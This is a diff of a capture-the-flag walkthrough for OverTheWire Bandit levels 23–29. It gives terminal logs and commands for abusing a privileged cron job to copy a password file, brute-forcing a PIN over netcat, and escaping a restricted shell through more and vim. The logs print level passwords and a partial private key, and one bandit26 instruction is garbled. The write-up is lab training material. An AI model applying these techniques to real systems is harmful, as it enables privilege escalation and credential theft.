@@ -4101,55 +4101,467 @@ NOTE 2: Keep in mind that your shell script is removed once executed, so you may
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ ssh -p 2220 bandit23@bandit.labs.overthewire.org
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
 
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit23@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ ls
+behemoth4_cleanup  clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  leviathan5_cleanup  manpage3_resetpw_job  otw-tmp-dir  sysstat
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit 
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+donebandit23@bandit:/etc/cron.d$ cd /tmp/script
+bandit23@bandit:/tmp/script$ vi getpassword.sh
+bandit23@bandit:/tmp/script$ cat getpassword.sh 
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/script/password.txt
+bandit23@bandit:/tmp/script$ ls -lia
+total 528
+331412 drwxrwxrwx    2 bandit23 bandit23   4096 Apr 10 12:22 .
+  1750 drwxrwx-wt 3165 root     root     135168 Apr 10 12:23 ..
+ 87495 -rw-rw-r--    1 bandit24 bandit24    118 Apr  6 13:53 bf.sh
+339558 -rw-rw-r--    1 bandit23 bandit23     69 Apr 10 12:22 getpassword.sh
+331642 -rwxrwxr-x    1 bandit23 bandit23     74 Apr  6 13:04 myscript.sh
+331577 -rwxrwxrwx    1 bandit23 bandit23     99 Apr  6 13:05 passwd
+332718 -rw-rw-r--    1 bandit24 bandit24 380000 Apr  6 13:53 wordlist.txt
+bandit23@bandit:/tmp/script$ chmod 777 getpassword.sh 
+bandit23@bandit:/tmp/script$ ls -lia
+total 528
+331412 drwxrwxrwx    2 bandit23 bandit23   4096 Apr 10 12:22 .
+  1750 drwxrwx-wt 3166 root     root     135168 Apr 10 12:24 ..
+ 87495 -rw-rw-r--    1 bandit24 bandit24    118 Apr  6 13:53 bf.sh
+339558 -rwxrwxrwx    1 bandit23 bandit23     69 Apr 10 12:22 getpassword.sh
+331642 -rwxrwxr-x    1 bandit23 bandit23     74 Apr  6 13:04 myscript.sh
+331577 -rwxrwxrwx    1 bandit23 bandit23     99 Apr  6 13:05 passwd
+332718 -rw-rw-r--    1 bandit24 bandit24 380000 Apr  6 13:53 wordlist.txt
+bandit23@bandit:/tmp/script$ cp getpassword.sh /var/spool/bandit24/foo
+bandit23@bandit:/tmp/script$ ls
+bf.sh  getpassword.sh  myscript.sh  passwd  wordlist.txt
+bandit23@bandit:/tmp/script$ ls
+bf.sh  getpassword.sh  myscript.sh  passwd  password.txt  wordlist.txt
+bandit23@bandit:/tmp/script$ cat password.txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+bandit23@bandit:/tmp/script$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+cd /etc/cron.d → Navigate to the cron job configuration directory.
+cat cronjob_bandit24 → Identify which script is being executed automatically.
+cat /usr/bin/cronjob_bandit24.sh → Analyze the script logic to understand how it works.
+mkdir /tmp/script (or similar working directory) → Create a safe place to store your custom script.
+vi getpassword.sh (or any editor) → Create your own shell script.
+chmod 777 getpassword.sh → Make the script executable so cron can run it.
+cp getpassword.sh /var/spool/bandit24/foo → Place your script where the cron job will execute it.
+cat /tmp/script/password.txt → Read the output file containing the password. (will only be obtained 1 minute after the command above executed)
 ```
 
 ### Note: 
+This challenge is solved by taking advantage of how a cron job executes user-owned scripts from a specific directory. By inspecting `/etc/cron.d/cronjob_bandit24`, you find that a script runs every minute as bandit24, and it executes all files inside `/var/spool/bandit24/foo` that are owned by bandit23, then deletes them afterward. Since you are bandit23, you can place your own script in that directory. You create a simple shell script (getpassword.sh) that reads the protected file `/etc/bandit_pass/bandit24` and writes its contents to a location you control (e.g., /tmp/script/password.txt). After making the script executable and copying it into `/var/spool/bandit24/foo`, the cron job automatically runs it with bandit24 privileges, allowing access to the restricted password file. Even though the script is deleted after execution, the output file remains, so you can read it and obtain the password for the next level. The key idea is exploiting a privileged cron job that executes user-controlled scripts, effectively allowing you to run commands as another user.
+
 
 ---
 
 
 ## Bandit 24
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ ssh -p 2220 bandit24@bandit.labs.overthewire.org
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
 
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit24@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
+Wrong! Please enter the correct current password and pincode. Try again.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
+Wrong! Please enter the correct current password and pincode. Try again.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
+Wrong! Please enter the correct current password and pincode. Try again.
+^C
+bandit24@bandit:~$ for i in {0000..9999}; do echo $i; echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+...
+...
+...
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+bandit24@bandit:~$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+for i in {0000..9999}; do echo $i; echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002
 ```
 
 ### Note: 
+This challenge is solved by performing a brute-force attack using a single persistent Netcat connection, instead of repeatedly reconnecting. The service on port 30002 expects multiple inputs in the same session, so you generate all possible 4-digit PIN combinations (0000 to 9999) using a for loop and format each attempt as "password PIN". These attempts are then piped directly into nc localhost 30002, which sends them continuously to the daemon in one connection. The service processes each line sequentially until it finds the correct PIN, at which point it responds with “Correct!” and reveals the password for the next level. This method is more efficient because it avoids the overhead of opening thousands of separate connections and matches the behavior hinted in the challenge (“You do not need to create new connections each time”).
+
 
 ---
 
 
 ## Bandit 25
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+NOTE: if you’re a Windows user and typically use Powershell to ssh into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ ssh -p 2220 bandit25@bandit.labs.overthewire.org
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit25@bandit.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+bandit25@bandit:~$ ls
+bandit26.sshkey
+bandit25@bandit:~$ cat bandit26.sshkey 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+(......private key content......)
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+exec more ~/text.txt
+exit 0
+bandit25@bandit:~$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
+
 
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+ls
+cat bandit26.sshkey
+cat /etc/passwd | grep bandit26
+cat /usr/bin/showtext
 ```
 
+### What you discover:
+bandit26 uses /usr/bin/showtext instead of /bin/bash
+showtext runs: more ~/text.txt
+the problem is when you SSH into bandit26, it immediately runs `more`. Therefore, you cannot get a shell
+
 ### Note: 
+Bandit 25 provides an SSH private key used to log into bandit26, but instead of a normal shell, the login executes a restricted script (showtext) that runs the more pager on a file and immediately exits. By inspecting /etc/passwd and the script, you discover that no direct shell is given. 
 
 ---
 
@@ -4161,133 +4573,850 @@ Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read t
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~/otw_test]
+└─$ ssh -p 2220 bandit26@bandit.labs.overthewire.org -i sshkey.private
+v
+:set shell=/bin/bash
+:shell
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
+s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
+bandit26@bandit:~$ cat /etc/bandit_pass/bandit27
+cat: /etc/bandit_pass/bandit27: Permission denied
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+bandit26@bandit:~$ cat text.txt 
+  _                     _ _ _   ___   __   
+ | |                   | (_) | |__ \ / /     
+ | |__   __ _ _ __   __| |_| |_   ) / /_     
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \     
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |    
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/    
+bandit26@bandit:~$ ./bandit27-do 
+Run a command as another user.   
+  Example: ./bandit27-do id      
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27      
+upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB               
+bandit26@bandit:~$   
 
 ```
 
-### Commands used to solve this level
-```bash
-nc localhost 30000
-```
+### Commands and steps used to solve this level
+Minimize the size of the terminal to exploit the `more` discovered from Bandit 25. Then run the command `ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org`. Then, press v on the keyboard to open the vim. Inside vim, use the command `:set shell=/bin/bash` and 
+`:shell`. After `bandit26@bandit:~$ ` exist, use the command `bandit26@bandit:~$ ` to obtain the password for next challenge. 
 
 ### Note: 
+The exploit relies on forcing more into interactive mode by resizing the terminal during SSH login. Once inside more, pressing v opens the file in vim, which can then be used to spawn a shell by setting the shell to /bin/bash and executing it. This grants access as bandit26, allowing the final password to be retrieved from /etc/bandit_pass/bandit26.
+
 
 ---
 
 
 ## Bandit 27
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+There is a git repository at ssh://bandit27-git@bandit.labs.overthewire.org/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ mktemp -d
+/tmp/tmp.gvf3hgaIDK
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[~]
+└─$ cd /tmp/tmp.gvf3hgaIDK
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.gvf3hgaIDK]
+└─$ git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit27-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (3/3), done.
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.gvf3hgaIDK]
+└─$ ls
+repo
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.gvf3hgaIDK]
+└─$ cd repo               
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.gvf3hgaIDK/repo]
+└─$ ls     
+README
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.gvf3hgaIDK/repo]
+└─$ cat README 
+The password to the next level is: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
+
 
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
 ```
 
 ### Note: 
+Bandit 27 is solved by creating a temporary working directory and cloning a remote Git repository using SSH authentication with the bandit27-git user. After entering the repository and successfully downloading its contents, the password for the next level is found inside a file called README. This level tests understanding of Git cloning over SSH and basic file navigation rather than system exploitation or privilege escalation.
 
 ---
 
 
 ## Bandit 28
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+There is a git repository at ssh://bandit28-git@bandit.labs.overthewire.org/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ mktemp -d
+/tmp/tmp.v5X9N7GCvz
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[~]
+└─$ cd /tmp/tmp.v5X9N7GCvz
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz]
+└─$ git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit28-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (9/9), done.
+Resolving deltas: 100% (2/2), done.
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz]
+└─$ ls 
+repo
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz]
+└─$ cd repo               
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz/repo]
+└─$ ls
+README.md
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz/repo]
+└─$ cat README.md 
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz/repo]
+└─$ git log                                                                             
+commit adc7f885a129baee883058b8a870739489f80194 (HEAD -> master, origin/master, origin/HEAD)
+Author: Morla Porla <morla@overthewire.org>
+Date:   Fri Apr 3 15:17:54 2026 +0000
+
+    fix info leak
+
+commit a3437bddd447f2d496731658e86b98cbea9d3c98
+Author: Morla Porla <morla@overthewire.org>
+Date:   Fri Apr 3 15:17:54 2026 +0000
+
+    add missing data
+
+commit cb630ec182b75bc289595511f8bcf4d47cfec50d
+Author: Ben Dover <noone@overthewire.org>
+Date:   Fri Apr 3 15:17:54 2026 +0000
+
+    initial commit of README.md
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz/repo]
+└─$ git checkout a3437bddd447f2d496731658e86b98cbea9d3c98                               
+Note: switching to 'a3437bddd447f2d496731658e86b98cbea9d3c98'.
+
+You are in 'detached HEAD' state. You can look around, make experimental
+changes and commit them, and you can discard any commits you make in this
+state without impacting any branches by switching back to a branch.
+
+If you want to create a new branch to retain commits you create, you may
+do so (now or later) by using -c with the switch command. Example:
+
+  git switch -c <new-branch-name>
+
+Or undo this operation with:
+
+  git switch -
+
+Turn off this advice by setting config variable advice.detachedHead to false
+
+HEAD is now at a3437bd add missing data
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.v5X9N7GCvz/repo]
+└─$ cat README.md
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
+
 
 ```
 
 ### Commands used to solve this level
 ```bash
-nc localhost 30000
+git log
+git checkout 
 ```
 
 ### Note: 
+Bandit 28 is solved by cloning a Git repository and discovering that the current version of the README file contains a redacted password. By inspecting the commit history using git log, you identify an earlier commit where the password was still present. Switching to that specific commit using git checkout reveals the previous version of the file, which contains the actual password for the next level. This level demonstrates how Git preserves historical data, making it possible to recover information that was removed in later commits.
+
 
 ---
 
 
 ## Bandit 29 
 ### Level Goal
-The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL/TLS encryption.
-Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.
+There is a git repository at ssh://bandit29-git@bandit.labs.overthewire.org/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.
+
+From your local machine (not the OverTheWire machine!), clone the repository and find the password for the next level. This needs git installed locally on your machine.
 
 ### Execution Log 
 ```bash
+┌──(incognito㉿kali)-[~]
+└─$ mktemp -d
+/tmp/tmp.Q4VpiHa0vw
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[~]
+└─$ cd /tmp/tmp.Q4VpiHa0vw
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw]
+└─$ git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
+Cloning into 'repo'...
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+bandit29-git@bandit.labs.overthewire.org's password: 
+remote: Enumerating objects: 16, done.
+remote: Counting objects: 100% (16/16), done.
+remote: Compressing objects: 100% (11/11), done.
+remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (16/16), done.
+Resolving deltas: 100% (2/2), done.
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw]
+└─$ ls
+repo
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw]
+└─$ cd repo               
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
+└─$ ls
+README.md
+                                                                                                                                                                    
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
+└─$ cat README.md
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: <no passwords in production!>
+
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
+└─$ git branch                                                                          
+* master
+                                                                                                                                                                      
+┌──(incognito㉿kali)-[/tmp/tmp.Q4VpiHa0vw/repo]
